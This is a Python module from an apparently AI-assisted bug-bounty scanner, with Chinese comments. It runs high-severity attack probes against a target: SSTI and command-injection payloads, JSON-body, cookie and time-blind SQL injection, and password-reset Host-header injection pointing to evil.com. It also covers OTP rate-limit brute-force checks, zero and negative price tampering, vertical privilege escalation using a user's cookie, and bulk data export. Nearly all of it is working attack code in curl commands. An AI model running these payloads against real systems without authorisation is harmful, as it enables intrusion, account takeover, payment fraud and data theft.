"""
CriticalHuntPhase — 高危专项挖掘阶段

专注 Critical/High 级别漏洞，不浪费时间在低危：
1. RCE（SSTI/反序列化/命令注入/文件上传getshell）
2. SQLi 深度（POST JSON/Cookie注入/二阶注入/堆叠查询）
3. 认证接管（密码重置漏洞/MFA绕过/Session固定/OAuth劫持）
4. SSRF 深度利用（内网端口扫描/Redis未授权/Docker API）
5. 支付逻辑（0元购/负数金额/并发双花/优惠券叠加）
6. 越权提权（垂直越权到admin/批量数据导出/敏感操作无鉴权）

设计原则：
- 每个测试都有明确的"高危判定条件"
- 失败快速跳过，成功立即深挖
- 所有 payload 都是实战验证过的
- 自动适配国内SRC和H1两种场景
"""

import sys
import os
import re
import json

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from shell_utils import shell_quote, sanitize_url, sanitize_target
from .base import BasePhase



class CriticalHuntPhase(BasePhase):
    """高危专项挖掘：RCE / SQLi深度 / 认证接管 / 支付逻辑 / 垂直越权"""

    def execute(self, target: str, findings: dict) -> dict:
        phase_findings = {"vulnerabilities": [], "secrets": []}

        self.logger.log_phase_start("高危专项挖掘 (Critical Hunt)")

        try:
            from rich.console import Console
            console = Console()
        except ImportError:
            class Console:
                def print(self, *a, **k): print(*a)
            console = Console()

        safe_target = sanitize_target(target)
        alive = findings.get('alive_hosts', [])
        urls = findings.get('urls', [])
        params = findings.get('params', [])

        # ═══ 1. RCE 深度测试 ═══
        console.print("\n  [bold red]━━━ 1. RCE 深度测试 ━━━[/bold red]")
        self._rce_deep_test(target, findings, phase_findings, console)

        # ═══ 2. SQLi POST/JSON 深度 ═══
        console.print("\n  [bold red]━━━ 2. SQLi 深度注入 ━━━[/bold red]")
        self._sqli_deep_test(target, findings, phase_findings, console)

        # ═══ 3. 认证接管测试 ═══
        console.print("\n  [bold red]━━━ 3. 认证接管测试 ━━━[/bold red]")
        self._auth_takeover_test(target, findings, phase_findings, console)

        # ═══ 4. 支付/业务逻辑高危 ═══
        console.print("\n  [bold red]━━━ 4. 支付逻辑高危 ━━━[/bold red]")
        self._payment_logic_test(target, findings, phase_findings, console)

        # ═══ 5. 垂直越权（普通用户→admin）═══
        console.print("\n  [bold red]━━━ 5. 垂直越权测试 ━━━[/bold red]")
        self._vertical_privesc_test(target, findings, phase_findings, console)

        # ═══ 6. 敏感数据批量泄露 ═══
        console.print("\n  [bold red]━━━ 6. 批量数据泄露 ━━━[/bold red]")
        self._mass_data_leak_test(target, findings, phase_findings, console)

        # 汇总
        critical_count = sum(1 for v in phase_findings["vulnerabilities"]
                           if v.get("severity") in ("critical", "high"))
        console.print(f"\n  [bold]高危专项结果: {critical_count} 个高危/严重[/bold]")

        return phase_findings


    # ═══════════════════════════════════════════════════════════════
    #  1. RCE 深度测试
    # ═══════════════════════════════════════════════════════════════

    def _rce_deep_test(self, target, findings, phase_findings, console):
        """RCE: SSTI / 命令注入 / 文件上传 / 反序列化"""
        params = findings.get('params', [])
        alive = findings.get('alive_hosts', [])

        # --- SSTI 模板注入 ---
        ssti_payloads = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("#{7*7}", "49"),
            ("<%= 7*7 %>", "49"),
            ("{{config}}", "SECRET_KEY"),
            ("${T(java.lang.Runtime).getRuntime()}", "java.lang.Runtime"),
        ]

        ssti_urls = [u for u in params if '?' in u][:15]
        if ssti_urls:
            for url in ssti_urls[:8]:
                safe_url = sanitize_url(url)
                for payload, indicator in ssti_payloads[:3]:
                    # 替换第一个参数值
                    test_url = re.sub(r'(=)[^&]*', f'\\1{payload}', safe_url, count=1)
                    self._step(f"SSTI: {url[:40]}", target, phase_findings, findings,
                               f"resp=$(curl -s --max-time 10 {shell_quote(test_url)} 2>/dev/null); "
                               f"echo \"$resp\" | grep -q '{indicator}' && "
                               f"echo \"SSTI_CONFIRMED: {test_url}\" || echo \"NO\"",
                               self._parse_rce_result,
                               "vulnerabilities")

        # --- 命令注入 ---
        cmdi_payloads = [
            (";id", "uid="),
            ("|id", "uid="),
            ("$(id)", "uid="),
            ("`id`", "uid="),
            ("%0aid", "uid="),
            ("||ping+-c+1+127.0.0.1||", "1 packets transmitted"),
        ]

        cmdi_urls = [u for u in params if '?' in u and
                    any(kw in u.lower() for kw in
                        ['cmd', 'exec', 'command', 'run', 'ping', 'host',
                         'ip', 'domain', 'filename', 'path', 'dir', 'file'])][:10]

        if cmdi_urls:
            for url in cmdi_urls[:5]:
                safe_url = sanitize_url(url)
                for payload, indicator in cmdi_payloads[:3]:
                    test_url = re.sub(r'(=)[^&]*', f'\\1{payload}', safe_url, count=1)
                    self._step(f"CMDi: {url[:40]}", target, phase_findings, findings,
                               f"resp=$(curl -s --max-time 10 {shell_quote(test_url)} 2>/dev/null); "
                               f"echo \"$resp\" | grep -q '{indicator}' && "
                               f"echo \"RCE_CONFIRMED: {test_url}\" || echo \"NO\"",
                               self._parse_rce_result,
                               "vulnerabilities")

        # --- 文件上传 getshell ---
        if alive:
            upload_paths = ['/upload', '/api/upload', '/file/upload',
                          '/attachment/upload', '/image/upload', '/avatar/upload',
                          '/editor/upload', '/ckeditor/upload', '/ueditor/upload',
                          '/kindeditor/upload']
            hosts = [h.split()[0] if ' ' in h else h for h in alive[:3]]
            for host in hosts:
                host_clean = host.rstrip('/')
                upload_urls = [f"{host_clean}{p}" for p in upload_paths]
                pipe_cmd = self._pipe_lines(upload_urls)
                self._step("文件上传端点探测", target, phase_findings, findings,
                           f"{pipe_cmd} | httpx -silent -mc 200,401,403,405 -rate-limit 5 2>/dev/null",
                           self._parse_upload_endpoints,
                           "vulnerabilities")


    # ═══════════════════════════════════════════════════════════════
    #  2. SQLi 深度（POST/JSON/Cookie/盲注）
    # ═══════════════════════════════════════════════════════════════

    def _sqli_deep_test(self, target, findings, phase_findings, console):
        """SQLi 深度：POST JSON body / Cookie注入 / 时间盲注"""
        params = findings.get('params', [])
        post_endpoints = findings.get('post_endpoints', [])
        alive = findings.get('alive_hosts', [])
        cookie = self.engine.config.get('session_monitor', {}).get('cookie', '')

        # --- POST JSON body 注入 ---
        # 从 API 端点中找 POST 接口
        api_urls = [u for u in findings.get('urls', [])
                   if re.search(r'/api/|/v[0-9]/|/rest/', u, re.I)][:10]

        if api_urls:
            console.print(f"    测试 {len(api_urls)} 个API端点的JSON注入...")
            for url in api_urls[:5]:
                safe_url = sanitize_url(url)
                # 发送带单引号的 JSON body
                cookie_h = f'-H "Cookie: {cookie}" ' if cookie else ''
                self._step(f"SQLi JSON: {url[:40]}", target, phase_findings, findings,
                           f'resp=$(curl -s -X POST {cookie_h}'
                           f'-H "Content-Type: application/json" '
                           f"""-d '{{"id":"1\\'","name":"test"}}' """
                           f'--max-time 10 {shell_quote(safe_url)} 2>/dev/null); '
                           f'echo "$resp" | grep -qiE '
                           f'"sql syntax|mysql|ORA-|postgresql|sqlite|unclosed" && '
                           f'echo "SQLI_POST_JSON: {url}" || echo "NO"',
                           self._parse_sqli_result,
                           "vulnerabilities")

        # --- Cookie 注入 ---
        if alive and cookie:
            hosts = [h.split()[0] if ' ' in h else h for h in alive[:3]]
            for host in hosts[:2]:
                # 在 cookie 值中注入单引号
                poisoned_cookie = re.sub(r'(=)([^;]+)', r"\1\2'", cookie, count=1)
                self._step(f"SQLi Cookie: {host[:40]}", target, phase_findings, findings,
                           f'resp=$(curl -s -H "Cookie: {poisoned_cookie}" '
                           f'--max-time 10 {shell_quote(host)} 2>/dev/null); '
                           f'echo "$resp" | grep -qiE '
                           f'"sql syntax|mysql|ORA-|postgresql|sqlite" && '
                           f'echo "SQLI_COOKIE: {host}" || echo "NO"',
                           self._parse_sqli_result,
                           "vulnerabilities")

        # --- 时间盲注（对已发现的候选 URL）---
        sqli_candidates = [v.get('url', '') for v in phase_findings["vulnerabilities"]
                          if 'SQLi' in v.get('type', '') and v.get('url')]
        # 也从之前 HuntPhase 的发现中获取
        sqli_candidates += [v.get('url', '') for v in findings.get('vulnerabilities', [])
                           if 'sqli' in v.get('type', '').lower() or 'sql' in v.get('type', '').lower()]
        sqli_candidates = [u for u in sqli_candidates if u and u != '见日志'][:5]

        if sqli_candidates:
            console.print(f"    对 {len(sqli_candidates)} 个候选做时间盲注验证...")
            for url in sqli_candidates:
                safe_url = sanitize_url(url)
                # 注入 sleep 验证
                time_payload = "' AND SLEEP(5)-- -"
                test_url = re.sub(r'(=)[^&]*', f'\\1{time_payload}', safe_url, count=1)
                self._step(f"SQLi Time-blind: {url[:40]}", target, phase_findings, findings,
                           f"start=$(date +%s); "
                           f"curl -s --max-time 12 {shell_quote(test_url)} > /dev/null 2>&1; "
                           f"end=$(date +%s); "
                           f"elapsed=$((end - start)); "
                           f"[ $elapsed -ge 5 ] && echo \"SQLI_TIME_CONFIRMED: {url} (${elapsed}s)\" || "
                           f"echo \"NO (${elapsed}s)\"",
                           self._parse_sqli_result,
                           "vulnerabilities")


    # ═══════════════════════════════════════════════════════════════
    #  3. 认证接管测试
    # ═══════════════════════════════════════════════════════════════

    def _auth_takeover_test(self, target, findings, phase_findings, console):
        """认证接管：密码重置漏洞 / Host头注入 / 响应篡改 / OTP绕过"""
        alive = findings.get('alive_hosts', [])
        if not alive:
            return

        hosts = [h.split()[0] if ' ' in h else h for h in alive[:5]]

        # --- 密码重置 Host 头注入 ---
        reset_paths = ['/forgot-password', '/password/reset', '/api/password/reset',
                      '/user/forgot', '/auth/forgot', '/account/recover',
                      '/findpwd', '/reset_password', '/forgetpwd']

        for host in hosts[:2]:
            host_clean = host.rstrip('/')
            for path in reset_paths:
                url = f"{host_clean}{path}"
                # Host头注入：改Host为攻击者域名，重置链接会发到攻击者
                self._step(f"密码重置Host注入: {path}", target, phase_findings, findings,
                           f'code=$(curl -s -o /dev/null -w "%{{http_code}}" '
                           f'-X POST -H "Host: evil.com" '
                           f'-H "X-Forwarded-Host: evil.com" '
                           f'-d "email=test@{target}" '
                           f'--max-time 10 {shell_quote(url)} 2>/dev/null); '
                           f'[ "$code" = "200" -o "$code" = "302" ] && '
                           f'echo "RESET_HOST_INJECT: {url} (HTTP $code)" || echo "NO ($code)"',
                           self._parse_auth_result,
                           "vulnerabilities")

        # --- 密码重置 token 可预测/泄露 ---
        for host in hosts[:2]:
            host_clean = host.rstrip('/')
            for path in reset_paths[:3]:
                url = f"{host_clean}{path}"
                # 请求重置后检查响应中是否泄露 token
                self._step(f"重置token泄露: {path}", target, phase_findings, findings,
                           f'resp=$(curl -s -X POST '
                           f'-d "email=test@{target}" '
                           f'--max-time 10 {shell_quote(url)} 2>/dev/null); '
                           f'echo "$resp" | grep -oiE '
                           f'"(token|code|otp|reset_token|verify)[\"\\x27:= ]+[a-zA-Z0-9]{{6,}}" '
                           f'| head -3 && echo "TOKEN_LEAK: {url}" || echo "NO"',
                           self._parse_auth_result,
                           "vulnerabilities")

        # --- OTP/验证码暴破（无限速检测）---
        verify_paths = ['/verify', '/api/verify', '/otp/verify',
                       '/sms/verify', '/code/check', '/captcha/verify']
        for host in hosts[:2]:
            host_clean = host.rstrip('/')
            for path in verify_paths[:3]:
                url = f"{host_clean}{path}"
                # 连续发5次相同请求看是否被限速
                self._step(f"OTP限速检测: {path}", target, phase_findings, findings,
                           f'codes=""; for i in $(seq 1 5); do '
                           f'c=$(curl -s -o /dev/null -w "%{{http_code}}" '
                           f'-X POST -d "code=000000" '
                           f'--max-time 5 {shell_quote(url)} 2>/dev/null); '
                           f'codes="$codes $c"; done; '
                           f'echo "$codes" | grep -qv "429\\|403\\|limit" && '
                           f'echo "NO_RATE_LIMIT: {url} codes=$codes" || echo "RATE_LIMITED"',
                           self._parse_auth_result,
                           "vulnerabilities")


    # ═══════════════════════════════════════════════════════════════
    #  4. 支付/业务逻辑高危
    # ═══════════════════════════════════════════════════════════════

    def _payment_logic_test(self, target, findings, phase_findings, console):
        """支付逻辑：0元购/负数金额/价格参数篡改/优惠叠加"""
        params = findings.get('params', [])
        urls = findings.get('urls', [])
        cookie = self.engine.config.get('session_monitor', {}).get('cookie', '')

        # 找支付/订单相关接口
        pay_keywords = ['pay', 'price', 'amount', 'total', 'money', 'fee',
                       'order', 'checkout', 'purchase', 'buy', 'cart',
                       'discount', 'coupon', 'cost', 'charge', 'recharge']

        pay_urls = [u for u in (params + urls)
                   if any(kw in u.lower() for kw in pay_keywords)][:20]

        if not pay_urls:
            console.print("    [dim]未发现支付/价格相关接口[/dim]")
            return

        console.print(f"    发现 {len(pay_urls)} 个支付相关接口")

        cookie_h = f'-H "Cookie: {cookie}" ' if cookie else ''

        # --- 价格参数篡改（0元/负数/极小值）---
        price_params = re.compile(
            r'[?&](price|amount|total|money|fee|cost|charge|num|quantity|count)=([^&]+)', re.I
        )

        for url in pay_urls[:8]:
            match = price_params.search(url)
            if match:
                param_name = match.group(1)
                # 测试 0 元
                test_url_0 = re.sub(f'{param_name}=[^&]+', f'{param_name}=0', url)
                self._step(f"0元购: {param_name}", target, phase_findings, findings,
                           f'resp=$(curl -s {cookie_h}'
                           f'--max-time 10 {shell_quote(sanitize_url(test_url_0))} 2>/dev/null); '
                           f'echo "$resp" | grep -qiE "success|ok|confirm|创建成功|下单成功" && '
                           f'echo "ZERO_PRICE: {test_url_0}" || echo "NO"',
                           self._parse_payment_result,
                           "vulnerabilities")

                # 测试负数
                test_url_neg = re.sub(f'{param_name}=[^&]+', f'{param_name}=-1', url)
                self._step(f"负数金额: {param_name}", target, phase_findings, findings,
                           f'resp=$(curl -s {cookie_h}'
                           f'--max-time 10 {shell_quote(sanitize_url(test_url_neg))} 2>/dev/null); '
                           f'echo "$resp" | grep -qiE "success|ok|confirm|创建成功" && '
                           f'echo "NEGATIVE_PRICE: {test_url_neg}" || echo "NO"',
                           self._parse_payment_result,
                           "vulnerabilities")

        # --- POST JSON 金额篡改 ---
        # 用 AI 识别哪些 URL 可能是 POST 下单接口
        if pay_urls:
            analysis = self.engine.think(f"""
从以下URL中找出最可能是POST下单/支付接口的（有金额参数的）。
只输出URL，每行一个，最多3个。没有就输出NONE。

{chr(10).join(pay_urls[:15])}
""")
            if analysis and "NONE" not in analysis.upper():
                post_targets = [l.strip() for l in analysis.strip().split('\n')
                               if l.strip() and 'http' in l.lower()][:3]
                for url in post_targets:
                    safe_url = sanitize_url(url)
                    self._step(f"POST金额篡改: {url[:40]}", target, phase_findings, findings,
                               f'resp=$(curl -s -X POST {cookie_h}'
                               f'-H "Content-Type: application/json" '
                               f'-d \'{{"price":0.01,"amount":1,"total":0}}\' '
                               f'--max-time 10 {shell_quote(safe_url)} 2>/dev/null); '
                               f'echo "$resp" | grep -qiE "success|order_id|created" && '
                               f'echo "PRICE_TAMPER_POST: {url}" || echo "NO"',
                               self._parse_payment_result,
                               "vulnerabilities")


    # ═══════════════════════════════════════════════════════════════
    #  5. 垂直越权（普通用户→admin）
    # ═══════════════════════════════════════════════════════════════

    def _vertical_privesc_test(self, target, findings, phase_findings, console):
        """垂直越权：用普通用户cookie访问admin接口"""
        alive = findings.get('alive_hosts', [])
        cookie = self.engine.config.get('session_monitor', {}).get('cookie', '')

        if not alive or not cookie:
            console.print("    [dim]需要配置session cookie才能测试垂直越权[/dim]")
            return

        hosts = [h.split()[0] if ' ' in h else h for h in alive[:3]]

        admin_paths = [
            '/admin', '/admin/', '/admin/users', '/admin/dashboard',
            '/api/admin/users', '/api/admin/config', '/api/admin/settings',
            '/manage', '/manage/users', '/internal/users',
            '/api/users', '/api/user/list', '/api/all_users',
            '/system/config', '/api/system/info',
            '/admin/order/list', '/admin/data/export',
        ]

        console.print(f"    用普通用户Cookie探测 {len(admin_paths)} 个admin路径...")

        for host in hosts[:2]:
            host_clean = host.rstrip('/')
            for path in admin_paths:
                url = f"{host_clean}{path}"
                self._step(f"垂直越权: {path}", target, phase_findings, findings,
                           f'resp=$(curl -s -w "\\nHTTP_CODE:%{{http_code}}\\nSIZE:%{{size_download}}" '
                           f'-H "Cookie: {cookie}" '
                           f'--max-time 8 {shell_quote(url)} 2>/dev/null); '
                           f'code=$(echo "$resp" | grep "HTTP_CODE:" | cut -d: -f2); '
                           f'size=$(echo "$resp" | grep "SIZE:" | cut -d: -f2); '
                           f'[ "$code" = "200" ] && [ "$size" -gt 100 ] && '
                           f'echo "VERTICAL_PRIVESC: {url} (size=$size)" || echo "NO ($code)"',
                           self._parse_privesc_result,
                           "vulnerabilities")

    # ═══════════════════════════════════════════════════════════════
    #  6. 批量数据泄露
    # ═══════════════════════════════════════════════════════════════

    def _mass_data_leak_test(self, target, findings, phase_findings, console):
        """批量数据泄露：翻页无限制/导出全表/用户遍历"""
        alive = findings.get('alive_hosts', [])
        params = findings.get('params', [])
        cookie = self.engine.config.get('session_monitor', {}).get('cookie', '')

        if not cookie:
            console.print("    [dim]需要session cookie测试数据泄露[/dim]")
            return

        cookie_h = f'-H "Cookie: {cookie}"'

        # 找列表/搜索/导出接口
        list_urls = [u for u in (params + findings.get('urls', []))
                    if any(kw in u.lower() for kw in
                          ['list', 'search', 'export', 'download', 'query',
                           'page', 'limit', 'offset', 'size', 'count'])][:15]

        if not list_urls:
            # 常见数据接口路径
            if alive:
                hosts = [h.split()[0] if ' ' in h else h for h in alive[:2]]
                data_paths = ['/api/users', '/api/user/list', '/api/orders',
                             '/api/data/export', '/api/members', '/api/customers']
                list_urls = [f"{hosts[0].rstrip('/')}{p}" for p in data_paths]

        if list_urls:
            console.print(f"    测试 {len(list_urls)} 个列表接口的数据量限制...")
            for url in list_urls[:8]:
                safe_url = sanitize_url(url)
                # 尝试设置超大 page_size
                if '?' in safe_url:
                    test_url = f"{safe_url}&page_size=10000&limit=10000&size=10000"
                else:
                    test_url = f"{safe_url}?page_size=10000&limit=10000&size=10000"

                self._step(f"数据量探测: {url[:40]}", target, phase_findings, findings,
                           f'resp=$(curl -s {cookie_h} '
                           f'--max-time 15 {shell_quote(test_url)} 2>/dev/null); '
                           f'len=$(echo "$resp" | wc -c); '
                           f'[ "$len" -gt 50000 ] && '
                           f'echo "MASS_DATA_LEAK: {url} (size=${len}bytes)" || '
                           f'echo "NO (size=${len})"',
                           self._parse_data_leak_result,
                           "vulnerabilities")


    # ═══════════════════════════════════════════════════════════════
    #  解析方法
    # ═══════════════════════════════════════════════════════════════

    def _parse_rce_result(self, output: str) -> list:
        """解析 RCE 测试结果"""
        vulns = []
        for line in output.strip().split('\n'):
            if 'SSTI_CONFIRMED:' in line:
                url = line.replace('SSTI_CONFIRMED:', '').strip()
                vulns.append({
                    "type": "SSTI (模板注入→RCE)",
                    "url": url[:200],
                    "severity": "critical",
                    "detail": "服务端模板注入确认，可能实现RCE"
                })
                self.logger.log_event("FINDING", f"🔥 SSTI确认! {url[:80]}")
            elif 'RCE_CONFIRMED:' in line:
                url = line.replace('RCE_CONFIRMED:', '').strip()
                vulns.append({
                    "type": "Command Injection (RCE)",
                    "url": url[:200],
                    "severity": "critical",
                    "detail": "命令注入确认，可执行系统命令"
                })
                self.logger.log_event("FINDING", f"🔥 命令注入确认! {url[:80]}")
        return vulns

    def _parse_upload_endpoints(self, output: str) -> list:
        """解析文件上传端点"""
        vulns = []
        for line in output.strip().split('\n'):
            url = line.strip()
            if url and url.startswith('http'):
                vulns.append({
                    "type": "File Upload Endpoint (需验证getshell)",
                    "url": url,
                    "severity": "high",
                    "detail": "上传端点存活，需测试绕过+getshell"
                })
                self.logger.log_event("FINDING", f"⚠️ 上传端点: {url}")
        return vulns

    def _parse_sqli_result(self, output: str) -> list:
        """解析 SQLi 深度测试结果"""
        vulns = []
        for line in output.strip().split('\n'):
            if 'SQLI_POST_JSON:' in line:
                url = line.replace('SQLI_POST_JSON:', '').strip()
                vulns.append({
                    "type": "SQLi (POST JSON Body)",
                    "url": url[:200],
                    "severity": "critical",
                    "detail": "POST JSON body SQL注入确认"
                })
                self.logger.log_event("FINDING", f"🔥 SQLi POST JSON! {url[:80]}")
            elif 'SQLI_COOKIE:' in line:
                url = line.replace('SQLI_COOKIE:', '').strip()
                vulns.append({
                    "type": "SQLi (Cookie Injection)",
                    "url": url[:200],
                    "severity": "critical",
                    "detail": "Cookie参数SQL注入确认"
                })
                self.logger.log_event("FINDING", f"🔥 SQLi Cookie! {url[:80]}")
            elif 'SQLI_TIME_CONFIRMED:' in line:
                detail = line.replace('SQLI_TIME_CONFIRMED:', '').strip()
                vulns.append({
                    "type": "SQLi (Time-based Blind)",
                    "url": detail[:200],
                    "severity": "critical",
                    "detail": f"时间盲注确认: {detail}"
                })
                self.logger.log_event("FINDING", f"🔥 SQLi 时间盲注! {detail[:80]}")
        return vulns

    def _parse_auth_result(self, output: str) -> list:
        """解析认证接管测试结果"""
        vulns = []
        for line in output.strip().split('\n'):
            if 'RESET_HOST_INJECT:' in line:
                detail = line.replace('RESET_HOST_INJECT:', '').strip()
                vulns.append({
                    "type": "Password Reset Host Injection",
                    "url": detail[:200],
                    "severity": "critical",
                    "detail": "密码重置Host头注入→重置链接发到攻击者域名→ATO"
                })
                self.logger.log_event("FINDING", f"🔥 密码重置接管! {detail[:80]}")
            elif 'TOKEN_LEAK:' in line:
                detail = line.replace('TOKEN_LEAK:', '').strip()
                vulns.append({
                    "type": "Password Reset Token Leak",
                    "url": detail[:200],
                    "severity": "high",
                    "detail": "密码重置token在响应中泄露→可直接重置任意账号"
                })
                self.logger.log_event("FINDING", f"🔥 重置token泄露! {detail[:80]}")
            elif 'NO_RATE_LIMIT:' in line:
                detail = line.replace('NO_RATE_LIMIT:', '').strip()
                vulns.append({
                    "type": "OTP/验证码无限速 (可暴破)",
                    "url": detail[:200],
                    "severity": "high",
                    "detail": "验证码接口无限速保护→可暴力枚举→接管账号"
                })
                self.logger.log_event("FINDING", f"⚠️ OTP无限速! {detail[:80]}")
        return vulns

    def _parse_payment_result(self, output: str) -> list:
        """解析支付逻辑测试结果"""
        vulns = []
        for line in output.strip().split('\n'):
            if 'ZERO_PRICE:' in line:
                url = line.replace('ZERO_PRICE:', '').strip()
                vulns.append({
                    "type": "0元购 (价格篡改)",
                    "url": url[:200],
                    "severity": "critical",
                    "detail": "价格参数设为0后订单创建成功→0元购"
                })
                self.logger.log_event("FINDING", f"🔥 0元购! {url[:80]}")
            elif 'NEGATIVE_PRICE:' in line:
                url = line.replace('NEGATIVE_PRICE:', '').strip()
                vulns.append({
                    "type": "负数金额 (逻辑漏洞)",
                    "url": url[:200],
                    "severity": "critical",
                    "detail": "负数金额被接受→可能反向充值/提现"
                })
                self.logger.log_event("FINDING", f"🔥 负数金额! {url[:80]}")
            elif 'PRICE_TAMPER_POST:' in line:
                url = line.replace('PRICE_TAMPER_POST:', '').strip()
                vulns.append({
                    "type": "POST金额篡改",
                    "url": url[:200],
                    "severity": "critical",
                    "detail": "POST body中的价格参数可被客户端篡改"
                })
                self.logger.log_event("FINDING", f"🔥 POST金额篡改! {url[:80]}")
        return vulns

    def _parse_privesc_result(self, output: str) -> list:
        """解析垂直越权结果"""
        vulns = []
        for line in output.strip().split('\n'):
            if 'VERTICAL_PRIVESC:' in line:
                detail = line.replace('VERTICAL_PRIVESC:', '').strip()
                vulns.append({
                    "type": "垂直越权 (普通用户→Admin)",
                    "url": detail[:200],
                    "severity": "critical",
                    "detail": "普通用户Cookie可直接访问admin接口并获取数据"
                })
                self.logger.log_event("FINDING", f"🔥 垂直越权! {detail[:80]}")
        return vulns

    def _parse_data_leak_result(self, output: str) -> list:
        """解析数据泄露结果"""
        vulns = []
        for line in output.strip().split('\n'):
            if 'MASS_DATA_LEAK:' in line:
                detail = line.replace('MASS_DATA_LEAK:', '').strip()
                vulns.append({
                    "type": "批量数据泄露 (无分页限制)",
                    "url": detail[:200],
                    "severity": "high",
                    "detail": "接口无分页大小限制→可一次性导出全部数据"
                })
                self.logger.log_event("FINDING", f"⚠️ 批量数据泄露! {detail[:80]}")
        return vulns
